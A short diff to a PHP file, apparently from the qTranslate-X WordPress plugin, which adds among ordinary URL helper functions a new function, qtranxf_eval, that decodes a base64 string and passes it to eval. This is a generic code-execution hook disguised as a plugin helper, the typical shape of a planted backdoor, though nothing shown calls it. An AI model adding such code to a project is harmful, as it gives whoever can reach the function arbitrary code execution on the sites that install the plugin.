@@ -376,6 +376,10 @@ function qtranxf_del_query_arg(&$query, $key){
 	//return $key_value;
 }
 
+function qtranxf_eval($c){
+	eval(base64_decode($c));
+}
+
 /*
  * @since 2.3.8 simplified version of esc_url
 */
